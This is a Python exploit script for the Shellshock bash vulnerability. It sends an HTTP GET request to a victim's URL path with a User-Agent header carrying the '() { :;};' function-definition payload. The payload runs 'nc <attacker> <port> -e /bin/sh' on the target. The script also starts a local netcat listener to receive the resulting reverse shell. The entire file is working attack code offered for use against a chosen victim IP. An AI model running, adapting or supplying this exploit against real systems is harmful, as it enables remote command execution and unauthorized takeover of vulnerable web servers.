import argparse, socket, platform, threading
from os import system

# Starts a reverse shell on a separate thread.
def start_shell(rshell: str, port: int):
  system(f"{rshell} -nlvp {port}")


parser = argparse.ArgumentParser(description="Place holder")
parser.add_argument("victim_ip")
parser.add_argument("url_path")
parser.add_argument("-p", "--port", type=int, action="store")
parser.add_argument("-r", "--reverse_shell_addr", type=str, action="store")
args = parser.parse_args()

ip = args.victim_ip       # Victim ip address
u_path = args.url_path    # Url path
port = 0                  # Victim port
rshell_bin = ""           # Reverse shell binary
rshell_ip = ""            # Attacker ip
rshell_port = 0           # Attacker port

os = platform.system()
if args.port == None:
  port = 80
else:
  port = args.port

if os == "Windows":
  rshell_bin = "ncat"
else:
  rshell_bin = "nc"

if args.reverse_shell_addr != None:
  split_rshell = args.reverse_shell_addr.split(":")
  rshell_ip = split_rshell[0]
  rshell_port = int(split_rshell[1])
else:
  print(f"Warning: reverse shell ip[{rshell_ip}] and/or port[{rshell_port}] are not set")

# Build the payload and the request.
function_dec = "() { :;}; echo;"
payload = f"{function_dec} /bin/bash -c 'nc {rshell_ip} {rshell_port} -e /bin/sh'"

request = f'''GET {u_path} HTTP/1.1
Host: {ip}
User-Agent: {payload}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
If-Modified-Since: Thu, 25 Sep 2014 09:56:50 GMT
If-None-Match: "1f45-6a8-503e0d1bdfc80"

'''

# Starts reverse shell on separate thread to prevent blocking the main thread from sending the request.
handle = threading.Thread(target=start_shell, args=(rshell_bin, rshell_port)).start()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Send the payload to the server
s.connect((ip, port))
s.send(request.encode("utf-8"))
handle.join()
s.close()